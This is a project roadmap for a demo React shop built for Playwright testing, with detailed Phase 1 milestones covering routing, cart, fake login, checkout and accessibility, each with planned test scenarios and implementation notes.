# Project Roadmap

This document is the **single source of truth** for the implementation plan and technical progress log.

**Current focus:** Phases 1–13 complete; waiting for the next phase to be defined

---

## How to Use This Document

### Before starting a milestone

1. Review this document.
2. Confirm the next milestone scope.
3. Explain what will be implemented.
4. Explain what should be testable later.
5. Do not include unrelated work.

### After completing a milestone

1. Update this document (checklist, status, date, summary, decisions, deviations).
2. Summarize the implementation.
3. Explain important architectural decisions.
4. Suggest future Playwright test scenarios.
5. Suggest a professional Conventional Commit message.
6. Stop and wait for approval before continuing.

### Living document rules

After every completed milestone, update:

- [ ] Completed checklist items
- [ ] Milestone status and completion date
- [ ] Summary of what was actually implemented
- [ ] Important architectural decisions
- [ ] Deviations from the original plan
- [ ] Dependencies, if changed

---

## Phase Overview

| Phase | Name | Status | Focus |
|---|---|---|---|
| **1** | Demo Shop Application | ✅ Completed | React demo e-commerce app |
| **2** | Playwright Testing Framework | ✅ Completed | POM, fixtures, suites, CI |
| **3** | AI Test Inspector | ✅ Completed | Failure analyzer CLI + optional LLM |
| **4** | Reliability & Flaky Detection | ✅ Completed | Checkout flake fix + flaky detection CLI |
| **5** | API Testing | ✅ Completed | Static `/api` contract + Playwright `@api` suite |
| **6** | Visual Regression | ✅ Completed | Playwright `toHaveScreenshot` + `@visual` suite |
| **7** | Historical Failure Trends | ✅ Completed | JSONL run history + Markdown trend reports |
| **8** | AI Run / PR Summaries | ✅ Completed | Multi-suite Markdown summary + PR comments |
| **9** | Dependency Gate | ✅ Completed | `npm ci`, `npm audit`, new-package check, Renovate + Dependabot alerts, faster CI |
| **10** | LLM Guardrails | ✅ Completed | OWASP LLM Top 10: prompt injection, output handling, input redaction |
| **11** | Quality Gates for AI-Written Code | ✅ Completed | Mutation testing, convention-aware PR review, gate list |
| **12** | Agentic Exploratory Testing | ✅ Completed | Spec-driven exploration agent via Playwright MCP |
| **13** | Locator Change Suggestions | ✅ Completed | Suggest the renamed element when a locator finds nothing; never auto-heal |

---

## Shared Conventions (Phase 1)

| Topic | Decision |
|---|---|
| **Stack** | React, TypeScript, Vite, Tailwind CSS, React Router, Context API, Local Storage |
| **Structure** | `app/` (application), `tests/` (Playwright — implemented in Phase 2) |
| **Data** | `app/data/products.json` (8–10 products), `app/data/users.json` (fake user) |
| **Auth** | Username `standard_user` / password `secret123`; checkout is protected |
| **Routes** | `/`, `/products`, `/products/:slug`, `/login`, `/cart`, `/checkout`, `/order-confirmation` |
| **Locator priority** | `getByRole` → `getByLabel` → stable `getByText` → `data-testid` only when needed |
| **`data-testid` convention** | kebab-case, area-prefixed: `cart-badge`, `product-card-{slug}`, `cart-item-{slug}` |
| **Out of scope (Phase 1)** | Search, filtering, payments, inventory, admin, backend, real auth |

---

# Phase 1 — Demo Shop Application

Build a simple, testable demo e-commerce application that provides realistic user journeys for Playwright learning. Specification: [`docs/APP_SPEC.md`](./APP_SPEC.md).

**Phase 1 status:** ✅ Completed  
**Phase 1 started:** 2026-07-06  
**Phase 1 completed:** 2026-07-06

---

## P1-M1 — Project Foundation

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** None

### Goal

Establish the React application scaffold, tooling, and repository structure so subsequent milestones can be built incrementally inside `app/`.

### Implementation scope

- Create `app/` with Vite + React + TypeScript + Tailwind CSS
- Configure path aliases and base project structure
- Add `app/data/` directory for static JSON
- Align repository layout with README (`app/`, `tests/`, `docs/`)
- Add npm scripts: `dev`, `build`, `preview`
- Document local setup in README (if not already present)

### User scenarios

- Developer clones the repo and runs the app locally without errors.
- Developer sees a minimal placeholder page confirming the app started successfully.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M1-01 | App dev server starts and serves the root page |
| P1-M1-02 | Page has a document title and main landmark |

### Accessibility considerations

- Valid HTML document structure (`lang` attribute on `<html>`).
- Single main landmark on the placeholder page.

### Locator strategy

- `getByRole('main')` on placeholder page.

### Acceptance criteria

- [x] `app/` exists with Vite + React + TypeScript + Tailwind configured
- [x] `npm run dev` starts the application without errors
- [x] `npm run build` completes successfully
- [x] Repository structure matches planned layout
- [x] No feature logic beyond a minimal placeholder

### Completion checklist

- [x] Vite + React + TypeScript initialized in `app/`
- [x] Tailwind CSS configured
- [x] Base folder structure created (`components/`, `pages/`, `context/`, `data/`, `types/`)
- [x] npm scripts added (`dev`, `build`, `preview`)
- [x] Placeholder root page renders
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Created `app/` as a self-contained Vite + React + TypeScript project with Tailwind CSS. Added a minimal placeholder page with `<main>` landmark and document title "Demo Shop". Restructured Playwright to `tests/` with `webServer` integration. Root `package.json` delegates `dev`, `build`, and `preview` to `app/`.

**Architectural decisions:**
- `app/` has its own `package.json` to keep the demo shop separate from root Playwright tooling.
- `@` path alias maps to `app/src/` for cleaner imports in later milestones.
- Playwright `baseURL` and `webServer` point at the Vite dev server on port 5173.

**Deviations:**
- Data directory created at `app/src/data/` (inside source tree) rather than `app/data/` for co-location with future imports.
- Removed legacy `e2e/` example spec in favour of `tests/smoke/`.

**Tests implemented:** P1-M1-01, P1-M1-02 in `tests/smoke/app-foundation.spec.ts` (2 passing).

---

## P1-M2 — Application Layout and Routing

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M1

### Goal

Create the shared application shell, navigation, and routing foundation used by all pages.

### Implementation scope

- Install and configure React Router
- Create `AppLayout` with header navigation
- Add routes: Home, Products, Cart, Login, Checkout, OrderConfirmation, NotFound
- Implement navigation links: Home, Products, Cart, Login
- Add active page indication in navigation
- Add cart badge placeholder (shows `0`)
- Create placeholder page components for each route

### User scenarios

- Visitor opens the app and lands on the Home page.
- Visitor navigates to Products, Cart, and Login via the header.
- Visitor sees which page is currently active in the navigation.
- Visitor on an unknown URL sees a 404 page with a link back to Home.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M2-01 | App loads at `/` with layout visible |
| P1-M2-02 | Navigation links (Home, Products, Cart, Login) are present |
| P1-M2-03 | Clicking Products navigates to `/products` |
| P1-M2-04 | Active nav link is indicated on the current page |
| P1-M2-05 | Unknown route shows 404 with link to Home |
| P1-M2-06 | Cart badge displays `0` initially |

### Accessibility considerations

- Landmarks: `<header>`, `<nav>`, `<main>`.
- One `<h1>` per page.
- Active nav link uses `aria-current="page"`.
- Visible `focus-visible` styles on all nav links.
- Cart link accessible name includes item count (e.g. "Cart, 0 items").

### Locator strategy

- `getByRole('navigation')`
- `getByRole('link', { name: 'Home' })`
- `getByRole('link', { name: 'Products' })`
- `getByRole('link', { name: /Cart/ })`
- `getByRole('link', { name: 'Login' })`
- `getByRole('heading', { name: 'Page not found' })`
- `data-testid="cart-badge"` only if count cannot be asserted via accessible name

### Acceptance criteria

- [x] All routes render inside a shared layout
- [x] Navigation works between all major pages
- [x] Active page is visually and semantically indicated
- [x] 404 page handles unknown routes
- [x] Cart badge visible in header (static `0` for now)

### Completion checklist

- [x] React Router configured
- [x] `AppLayout` component with header navigation
- [x] Routes: `/`, `/products`, `/login`, `/cart`, `/checkout`, `/order-confirmation`
- [x] 404 / NotFound page
- [x] Active nav state via `aria-current="page"`
- [x] Cart badge placeholder in header
- [x] Placeholder content on all pages
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Added React Router with a shared `AppLayout` (header, nav, main). Placeholder pages for all routes. `NavLink` provides active state via `aria-current="page"`. Cart link uses `aria-label="Cart, 0 items"` for accessible badge assertion.

**Architectural decisions:**
- `BrowserRouter` wraps the app in `main.tsx`; route definitions live in `App.tsx`.
- Layout route pattern (`<Route element={<AppLayout />}>`) keeps nav consistent without repeating markup.
- `NavLink` with `end` on Home prevents `/products` from highlighting Home.
- Catch-all `*` route renders `NotFoundPage` inside the layout so nav remains available on 404.

**Deviations:** None.

**Tests implemented:** P1-M2-01 through P1-M2-06 in `tests/smoke/app-layout.spec.ts` (6 passing). P1-M1 tests still pass (8 total).

---

## P1-M3 — Product Catalogue

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M2

### Goal

Display the full product catalogue from local JSON with add-to-cart actions.

### Implementation scope

- Create `app/data/products.json` with 8–10 products (image, name, slug, category, short description, full description, price)
- Build `ProductsPage`, `ProductGrid`, and `ProductCard` components
- Load products from JSON
- Add **Add to Cart** button on each product card
- Introduce `CartContext` with `addItem()` and `totalItems`
- Update header cart badge to reflect item count

### User scenarios

- Visitor opens Products and sees all catalogue items in a grid.
- Each card shows image, name, category, short description, price, and Add to Cart.
- Visitor adds a product to the cart; the cart badge updates.
- Visitor adds the same product twice; the badge reflects total item count.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M3-01 | Catalogue displays all products from JSON |
| P1-M3-02 | Product card shows name, category, price, and description |
| P1-M3-03 | Add to Cart from catalogue updates badge to `1` |
| P1-M3-04 | Adding same product twice updates badge to `2` |
| P1-M3-05 | Product images have alt text matching product name |

### Accessibility considerations

- Product grid as a list of `article` elements with product name as heading.
- Add to Cart buttons include product name: `Add {product name} to cart`.
- Images use `alt={product.name}`.
- Price displayed as text, not color-only.

### Locator strategy

- `getByRole('heading', { name: 'Products' })`
- `getByRole('article', { name: '{Product Name}' })`
- `getByRole('button', { name: 'Add {Product Name} to cart' })`
- `getByRole('link', { name: /Cart/ })` for badge assertion
- `data-testid="product-card-{slug}"` as fallback for scoped queries

### Acceptance criteria

- [x] 8–10 products loaded from `products.json`
- [x] Product grid renders all fields per APP_SPEC
- [x] Add to Cart updates `CartContext` and header badge
- [x] Quantity increments when same product is added again

### Completion checklist

- [x] `products.json` created with 8–10 products
- [x] `ProductCard` and `ProductGrid` components
- [x] `ProductsPage` renders full catalogue
- [x] `CartContext` with `addItem()` and `totalItems`
- [x] Header cart badge wired to context
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Added 8 demo products in `products.json`, `ProductCard`/`ProductGrid` components, and `CartContext` with `addItem()` and `totalItems`. Products page renders a responsive grid; Add to Cart updates the header badge with correct singular/plural labels.

**Architectural decisions:**
- `CartProvider` wraps the app in `main.tsx`; state is in-memory for now (Local Storage in P1-M5).
- Product `article` elements use `aria-labelledby` pointing to the card heading for stable `getByRole('article', { name })` queries.
- Add to Cart button text follows the pattern `Add {product name} to cart` for accessible, testable labels.
- Product images are local SVG placeholders in `public/images/products/`.

**Deviations:** None.

**Tests implemented:** P1-M3-01 through P1-M3-05 in `tests/smoke/product-catalogue.spec.ts` (5 passing). 13 tests total across P1-M1–P1-M3.

---

## P1-M4 — Product Details

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M3

### Goal

Allow visitors to view a single product's full details and add it to the cart from the detail page.

### Implementation scope

- Add route `/products/:slug`
- Build `ProductDetailPage` showing image, full description, category, price, Add to Cart
- Link product cards to detail pages
- Add "Back to products" navigation link
- Handle unknown product slugs with a not-found state
- Reuse `CartContext.addItem()` from P1-M3

### User scenarios

- Visitor clicks a product and lands on its detail page.
- Detail page shows full description, category, price, and image.
- Visitor adds the product to the cart from the detail page.
- Visitor navigates back to the catalogue.
- Visitor entering an invalid slug sees a product-not-found message.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M4-01 | Navigating to `/products/{slug}` shows product details |
| P1-M4-02 | Detail page displays full description, category, and price |
| P1-M4-03 | Add to Cart from detail page updates cart badge |
| P1-M4-04 | Clicking product in catalogue navigates to detail page |
| P1-M4-05 | Unknown slug shows product-not-found state |
| P1-M4-06 | Back to products link returns to catalogue |

### Accessibility considerations

- Single `h1` with product name on detail page.
- "Back to products" as a visible link (not icon-only).
- Add to Cart button accessible name includes product name.
- Full description in readable paragraph text.

### Locator strategy

- `getByRole('heading', { name: '{Product Name}', level: 1 })`
- `getByRole('link', { name: 'Back to products' })`
- `getByRole('button', { name: 'Add {Product Name} to cart' })`

### Acceptance criteria

- [x] Product detail page renders all fields per APP_SPEC
- [x] Navigation from catalogue to detail works
- [x] Add to Cart works from detail page
- [x] Unknown slugs handled gracefully

### Completion checklist

- [x] Route `/products/:slug` configured
- [x] `ProductDetailPage` component
- [x] Product cards link to detail pages
- [x] Back to products navigation
- [x] Unknown slug / not-found handling
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Added `/products/:slug` route with `ProductDetailPage` showing full product details and Add to Cart. Product names on catalogue cards link to detail pages. Unknown slugs render a product-not-found state with Back to products link.

**Architectural decisions:**
- Shared `getProductBySlug()` and `formatPrice()` in `utils/products.ts` to avoid duplication between card and detail views.
- Product not-found is handled inside `ProductDetailPage` (distinct from app-level 404).
- Product name links live inside the card heading to preserve `article` accessible names for tests.

**Deviations:** None.

**Tests implemented:** P1-M4-01 through P1-M4-06 in `tests/smoke/product-details.spec.ts` (6 passing). 19 tests total across P1-M1–P1-M4.

---

## P1-M5 — Shopping Cart

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M3

### Goal

Implement the full shopping cart with quantity management, totals, persistence, and a proceed-to-checkout action.

### Implementation scope

- Extend `CartContext`: items, quantities, add/remove/update/clear, subtotal, total
- Persist cart in Local Storage (`cart` key)
- Build `CartPage` with line items, quantity controls, remove, and clear
- Display empty cart state
- Add **Proceed to checkout** button (auth guard wired in P1-M6)
- Keep header badge in sync

### User scenarios

- Visitor views the cart with all added items, quantities, and totals.
- Visitor increases or decreases item quantity.
- Visitor removes a single item or clears the entire cart.
- Visitor sees an empty-cart message when no items are present.
- Cart contents persist after a page refresh.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M5-01 | Cart shows added items with name, quantity, and line subtotal |
| P1-M5-02 | Increase quantity updates line subtotal and cart total |
| P1-M5-03 | Decrease quantity to 0 removes the item |
| P1-M5-04 | Remove item deletes it and recalculates total |
| P1-M5-05 | Clear cart empties all items |
| P1-M5-06 | Empty cart shows message and link to Products |
| P1-M5-07 | Cart persists after page reload |
| P1-M5-08 | Proceed to checkout button is visible |

### Accessibility considerations

- Cart items in a table with `<th scope="col">` headers or a list with per-row labels.
- Quantity buttons: `Increase quantity of {name}`, `Decrease quantity of {name}`.
- Remove button: `Remove {name} from cart`.
- Clear cart: `Clear cart` button with descriptive label.
- Empty state: heading + descriptive text + link to Products.

### Locator strategy

- `getByRole('heading', { name: 'Shopping cart' })`
- `getByRole('row', { name: /{Product Name}/ })` if table layout
- `getByRole('button', { name: 'Remove {Product Name} from cart' })`
- `getByRole('button', { name: 'Clear cart' })`
- `getByRole('button', { name: 'Proceed to checkout' })`
- `data-testid="cart-total"` for total amount
- `data-testid="cart-item-{slug}"` for row-scoped queries

### Acceptance criteria

- [x] All cart operations work per APP_SPEC
- [x] Subtotal and total calculate correctly
- [x] Cart persists in Local Storage across refresh
- [x] Empty cart state displayed when cart is empty
- [x] Proceed to checkout button present

### Completion checklist

- [x] `CartContext` fully implemented
- [x] Local Storage persistence
- [x] `CartPage` with line items and controls
- [x] Quantity increase/decrease
- [x] Remove item and clear cart
- [x] Subtotal and total calculation
- [x] Empty cart state
- [x] Proceed to checkout button
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Extended `CartContext` with quantity controls, remove, clear, subtotal/total, and Local Storage persistence (`cart` key). Built full `CartPage` with accessible table layout, empty state, and Proceed to checkout button.

**Architectural decisions:**
- Cart storage logic isolated in `utils/cartStorage.ts` for testability and corrupt-data fallback.
- `CartProvider` lazy-loads from Local Storage on mount and syncs on every items change.
- Cart total equals subtotal (no tax/shipping in MVP).
- Proceed to checkout navigates to `/checkout`; auth guard deferred to P1-M6.

**Deviations:** None.

**Tests implemented:** P1-M5-01 through P1-M5-08 in `tests/smoke/shopping-cart.spec.ts` (8 passing). 27 tests total across P1-M1–P1-M5.

---

## P1-M6 — Fake Authentication

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M2, P1-M5

### Goal

Implement fake login/logout with session persistence and protect the checkout route.

### Implementation scope

- Create `app/data/users.json` with `standard_user` / `secret123`
- Build `AuthContext` with Local Storage persistence (`auth` key)
- Build `LoginPage` with username/password form and validation
- Add `ProtectedRoute` wrapper for `/checkout` and `/order-confirmation`
- Support return URL: `/login?redirect=/checkout`
- Update header: Login vs welcome message + Logout
- Wire **Proceed to checkout** auth guard from P1-M5

### User scenarios

- Guest clicks Login and sees a username/password form.
- User logs in with valid credentials and sees a welcome message.
- User enters invalid credentials and sees an error message.
- Logged-in user sees Logout in the navigation.
- Session persists after page refresh.
- Guest navigating to `/checkout` is redirected to `/login`.
- After login, user returns to the intended page (e.g. checkout).

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M6-01 | Login with `standard_user` / `secret123` succeeds |
| P1-M6-02 | Invalid credentials show error message |
| P1-M6-03 | Empty fields show validation errors |
| P1-M6-04 | Logout clears session and shows Login link |
| P1-M6-05 | Session persists after page reload |
| P1-M6-06 | Guest at `/checkout` redirects to `/login` |
| P1-M6-07 | Login with redirect returns to intended page |
| P1-M6-08 | Logged-in user can proceed to checkout |

### Accessibility considerations

- Labels linked to inputs via `htmlFor`/`id` — enables `getByLabel('Username')`.
- Error message uses `role="alert"` on failed login.
- Submit button: `Log in`.
- Password field `type="password"` with visible label.
- Validation errors linked via `aria-describedby`.

### Locator strategy

- `getByLabel('Username')`, `getByLabel('Password')`
- `getByRole('button', { name: 'Log in' })`
- `getByRole('alert')` for login error
- `getByRole('button', { name: 'Log out' })`
- `getByText('Welcome, standard_user')`

### Acceptance criteria

- [x] Valid credentials log the user in
- [x] Invalid credentials show an error without navigation
- [x] Session persists in Local Storage
- [x] Logout clears session
- [x] Checkout route is protected
- [x] Return URL redirect works after login

### Completion checklist

- [x] `users.json` with fake credentials
- [x] `AuthContext` with Local Storage persistence
- [x] `LoginPage` with form and validation
- [x] `ProtectedRoute` for checkout and confirmation
- [x] Return URL support (`?redirect=`)
- [x] Header shows Login/Logout state
- [x] Proceed to checkout auth guard wired
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Added fake authentication with `AuthContext`, login form, Local Storage session (`auth` key), and `ProtectedRoute` for checkout and order confirmation. Header shows welcome message and Log out when authenticated; Proceed to checkout redirects guests to login with return URL.

**Architectural decisions:**
- Auth storage isolated in `utils/authStorage.ts` mirroring cart pattern.
- `sanitizeRedirectPath()` prevents open redirects; invalid redirect falls back to `/products`.
- `ProtectedRoute` wraps route elements in `App.tsx` rather than nested route objects for clarity.
- Logout does not clear cart (documented behaviour for P1-M5).

**Deviations:** None.

**Tests implemented:** P1-M6-01 through P1-M6-08 in `tests/smoke/authentication.spec.ts` (8 passing). 35 tests total across P1-M1–P1-M6.

---

## P1-M7 — Checkout Flow

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M5, P1-M6

### Goal

Implement the checkout form, validation, order confirmation, and cart clearing.

### Implementation scope

- Build `CheckoutPage` with form fields: Name, Email, Address, City, ZIP Code
- Display read-only order summary alongside the form
- Client-side validation (required fields, basic email format)
- On submit: generate order ID (`ORD-{timestamp}`), clear cart, navigate to confirmation
- Build `OrderConfirmationPage` with order number, items, total, link to Products
- Guards: auth required, cart non-empty

### User scenarios

- Logged-in user with items proceeds to checkout and sees the form plus order summary.
- User submits valid details and sees an order confirmation page.
- User with an empty cart is blocked from checkout.
- User submits with missing fields and sees validation errors.
- Cart is cleared after a successful order.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M7-01 | Happy path: fill form, submit, see confirmation with order number |
| P1-M7-02 | Order summary on checkout matches cart contents |
| P1-M7-03 | Empty cart blocks checkout |
| P1-M7-04 | Required field validation on empty submit |
| P1-M7-05 | Invalid email format shows validation error |
| P1-M7-06 | Cart cleared after successful order |
| P1-M7-07 | Full E2E: browse → add → login → checkout → confirm |
| P1-M7-08 | Direct visit to confirmation without order redirects away |

### Accessibility considerations

- Form labels: Name, Email, Address, City, ZIP Code.
- Order summary section with `h2` heading.
- Confirmation page: `h1` "Order confirmed" with order number in text.
- Required fields marked with `aria-required="true"`.
- Submit button: `Place order`.

### Locator strategy

- `getByLabel('Name')`, `getByLabel('Email')`, `getByLabel('Address')`, `getByLabel('City')`, `getByLabel('ZIP Code')`
- `getByRole('button', { name: 'Place order' })`
- `getByRole('heading', { name: 'Order confirmed' })`
- `getByRole('region', { name: 'Order summary' })`
- `data-testid="order-number"` for dynamic order ID

### Acceptance criteria

- [x] Checkout form renders all fields per APP_SPEC
- [x] Validation errors shown for invalid/missing input
- [x] Order confirmation displays order number and summary
- [x] Cart cleared after successful checkout
- [x] Empty cart and unauthenticated access blocked

### Completion checklist

- [x] `CheckoutPage` with form and order summary
- [x] Client-side validation
- [x] Order ID generation
- [x] Cart cleared on successful submit
- [x] `OrderConfirmationPage` with order details
- [x] Auth and cart-non-empty guards
- [x] Double-submit prevention (disable button on submit)
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Built full checkout form with order summary, client-side validation, order ID generation (`ORD-{timestamp}`), and order confirmation page. Orders stored in `sessionStorage`; cart clears on successful submit. Empty cart redirects from checkout; confirmation page redirects to cart when no order exists.

**Architectural decisions:**
- Checkout validation isolated in `utils/checkout.ts` mirroring login pattern.
- Order snapshot stored in `sessionStorage` via `utils/orderStorage.ts` (session-scoped, not persisted across tabs).
- `isCompletingOrderRef` prevents empty-cart redirect race when cart clears before navigation completes.
- Order confirmation reads order from storage on render; no separate OrderContext needed for MVP.

**Deviations:** None.

**Tests implemented:** P1-M7-01 through P1-M7-08 in `tests/smoke/checkout-flow.spec.ts` (8 passing). 43 tests total across P1-M1–P1-M7.

---

## P1-M8 — Home Page and Featured Products

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M3

### Goal

Build the Home landing page with shop introduction and featured products, per APP_SPEC.

### Implementation scope

- Build `HomePage` with intro copy describing the demo shop
- Display featured products section (subset of catalogue flagged in JSON)
- Link featured product cards to detail pages
- Handle case when no products are flagged as featured

### User scenarios

- Visitor lands on Home and reads a brief shop introduction.
- Visitor sees featured products with key details.
- Visitor navigates to a product detail page from a featured card.
- Visitor uses navigation to reach other major pages from Home.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M8-01 | Home page shows intro heading and description |
| P1-M8-02 | Featured products section renders product cards |
| P1-M8-03 | Clicking featured product navigates to detail page |
| P1-M8-04 | No featured products shows fallback message |

### Accessibility considerations

- Proper heading hierarchy: `h1` for intro, `h2` for featured section.
- Featured products use same card accessibility patterns as P1-M3.
- Intro text readable and concise.

### Locator strategy

- `getByRole('heading', { name: 'Welcome to Demo Shop' })` (or stable copy)
- `getByRole('heading', { name: 'Featured products' })`
- `getByRole('article', { name: '{Product Name}' })` within featured section

### Acceptance criteria

- [x] Home page introduces the demo shop
- [x] Featured products displayed from JSON
- [x] Featured cards link to product detail pages
- [x] Navigation to all major pages works from Home

### Completion checklist

- [x] `HomePage` with intro content
- [x] Featured products flagged in `products.json`
- [x] Featured products section with `ProductCard` reuse
- [x] Links to product detail pages
- [x] Empty featured fallback message
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Rebuilt `HomePage` with welcome intro copy and a featured products section using reused `ProductGrid`/`ProductCard` components. Featured products filtered via `getFeaturedProducts()` from JSON `featured` flags. Empty state shows fallback message; `?featured=none` query param enables E2E testing of empty featured state.

**Architectural decisions:**
- `getFeaturedProducts()` added to `utils/products.ts` alongside existing catalogue helpers.
- Featured section uses `h2` under `h1` intro for proper heading hierarchy.
- `ProductGrid` reuse keeps card accessibility and add-to-cart behaviour consistent with catalogue.

**Deviations:**
- Home `h1` changed from "Demo Shop" to "Welcome to Demo Shop" per P1-M8 locator strategy; P1-M1/P1-M2 smoke tests updated accordingly.
- `?featured=none` query param added as a testability hook for P1-M8-04 empty featured state.

**Tests implemented:** P1-M8-01 through P1-M8-04 in `tests/smoke/home-page.spec.ts` (4 passing). 47 tests total across P1-M1–P1-M8.

---

## P1-M9 — Error and Empty States

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M2, P1-M4, P1-M5, P1-M6, P1-M7

### Goal

Consolidate and polish all error, empty, and edge-case states across the application.

### Implementation scope

- Review and standardize 404 page (app-level and product-level)
- Standardize empty cart state (verify from P1-M5)
- Standardize invalid login message (verify from P1-M6)
- Standardize form validation messages (verify from P1-M7)
- Standardize empty featured products state (verify from P1-M8)
- Handle corrupt Local Storage gracefully (cart and auth)
- Handle direct URL access to confirmation without a valid order
- Ensure consistent error message copy and visual treatment

### User scenarios

- Visitor navigates to an unknown URL and sees a helpful 404 page.
- Visitor searches for a non-existent product and sees a product-not-found page.
- Visitor views an empty cart and sees guidance to browse products.
- Visitor enters wrong login credentials and sees a clear error.
- Visitor submits an incomplete checkout form and sees field-level errors.
- Visitor with corrupted Local Storage data sees a clean fallback state.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M9-01 | 404 page for unknown app route |
| P1-M9-02 | Product not found for invalid slug |
| P1-M9-03 | Empty cart state with link to Products |
| P1-M9-04 | Invalid login error message |
| P1-M9-05 | Checkout validation errors for each required field |
| P1-M9-06 | Corrupt cart Local Storage falls back to empty cart |
| P1-M9-07 | Direct confirmation URL without order redirects |

### Accessibility considerations

- Error messages use `role="alert"` where appropriate.
- Empty states use headings and descriptive text (not icon-only).
- 404 page provides a clear navigation path back.
- Validation errors linked to fields via `aria-describedby`.

### Locator strategy

- `getByRole('heading', { name: 'Page not found' })`
- `getByRole('heading', { name: 'Product not found' })`
- `getByRole('heading', { name: 'Your cart is empty' })`
- `getByRole('alert')` for login and form errors

### Acceptance criteria

- [x] All error states listed in APP_SPEC are implemented
- [x] Error and empty state copy is consistent across the app
- [x] Corrupt Local Storage handled without crashes
- [x] Each error state provides a clear next action for the user

### Completion checklist

- [x] 404 page reviewed and polished
- [x] Product not-found state reviewed
- [x] Empty cart state reviewed
- [x] Invalid login message reviewed
- [x] Form validation messages reviewed
- [x] Empty featured products fallback reviewed
- [x] Corrupt Local Storage handling added
- [x] Stale confirmation page redirect added
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Consolidated error and empty state regression tests in a dedicated smoke suite. Hardened `cartStorage` and `authStorage` to validate stored data, clear corrupt entries, and fall back to safe defaults without crashing.

**Architectural decisions:**
- Cart items validated with `isValidCartItem()` before hydration; partial or malformed arrays treated as corrupt and cleared.
- Auth session requires non-empty `username` string; invalid shapes clear storage and log user out.
- Existing page copy and visual patterns from P1-M2–P1-M8 retained; P1-M9 focuses on verification and storage resilience rather than UI rewrites.

**Deviations:** None.

**Tests implemented:** P1-M9-01 through P1-M9-07 in `tests/smoke/error-empty-states.spec.ts` (7 passing). 54 tests total across P1-M1–P1-M9.

---

## P1-M10 — Accessibility and Testability Polish

**Status:** ✅ Completed  
**Completed:** 2026-07-06  
**Dependencies:** P1-M1–P1-M9

### Goal

Final pass on accessibility, responsive layout, and testability to ensure the app is a stable foundation for Phase 2 Playwright work.

### Implementation scope

- Responsive layout for all pages (mobile and desktop)
- Verify heading hierarchy on every page
- Verify keyboard navigation and focus states
- Verify all forms are fully label-accessible
- Review `data-testid` usage — add only where semantic locators are insufficient
- Remove any unstable DOM patterns (random IDs, layout-dependent selectors)
- Touch targets ≥ 44×44px on mobile
- Mobile navigation (wrap or simple menu if header overflows)

### User scenarios

- User on mobile viewport completes the full purchase flow without horizontal scroll.
- User navigates the entire app using keyboard only.
- User on desktop sees the same stable layout as during development.
- Tester can locate all interactive elements using Playwright `getByRole` queries.

### Future Playwright test scenarios

| ID | Scenario |
|---|---|
| P1-M10-01 | Full E2E happy path on desktop (1280px) |
| P1-M10-02 | Full E2E happy path on mobile (375px / Pixel 5) |
| P1-M10-03 | All pages have exactly one `h1` |
| P1-M10-04 | All form fields reachable and submittable via keyboard |
| P1-M10-05 | No horizontal scroll on mobile viewports |

### Accessibility considerations

- Complete audit of heading hierarchy across all routes.
- All interactive elements reachable via Tab key.
- `focus-visible` ring on all focusable elements.
- If hamburger menu used: `aria-label`, `aria-expanded`, `aria-controls`.
- No information conveyed by hover-only interactions.
- Color contrast meets WCAG AA.

### Locator strategy

- Final review: all interactive elements locatable via `getByRole` or `getByLabel`.
- Document any `data-testid` additions with justification.
- No mobile-specific test IDs — same locators work across viewports.

### Acceptance criteria

- [x] App is responsive on mobile and desktop
- [x] All pages pass heading hierarchy review
- [x] All forms fully accessible by label
- [x] All interactive elements keyboard-reachable
- [x] DOM structure is stable and predictable for Playwright
- [x] Phase 1 ready for Phase 2 test implementation

### Completion checklist

- [x] Responsive layout on all pages
- [x] Mobile navigation works
- [x] Heading hierarchy verified
- [x] Keyboard navigation verified
- [x] Focus states visible on all interactive elements
- [x] `data-testid` audit completed
- [x] Touch targets verified on mobile
- [x] Phase 1 completion summary written in this document
- [x] Roadmap updated with completion summary

### Implementation notes

**Summary:** Final Phase 1 pass on responsive layout, touch targets (min 44px), and mobile-friendly header (stacked layout with wrapping nav). Added cross-viewport E2E, heading hierarchy, keyboard form submission, and horizontal scroll regression tests.

**Architectural decisions:**
- Mobile nav uses stacked header + `flex-wrap` rather than a hamburger menu — sufficient for demo scope and keeps locators identical across viewports.
- Touch targets applied via `min-h-11` / `min-w-11` on nav links, cart controls, and primary action buttons.
- `data-testid` audit: retained four justified IDs (`product-card-{slug}`, `cart-item-{slug}`, `cart-total`, `order-number`); no new IDs added.

**Deviations:** None.

**Tests implemented:** P1-M10-01 through P1-M10-05 in `tests/smoke/accessibility-polish.spec.ts` (5 passing). **59 tests total across P1-M1–P1-M10.**

### Phase 1 completion summary

Phase 1 delivered a full demo e-commerce application with product catalogue, cart, fake auth, checkout, home page, error states, and accessibility polish. The app uses semantic HTML, `getByRole`-friendly patterns, Local Storage persistence, and 59 passing Playwright smoke tests across 10 milestones — ready for Phase 2 framework work (POM, fixtures, CI).

---

## Phase 1 — Milestone Dependency Graph

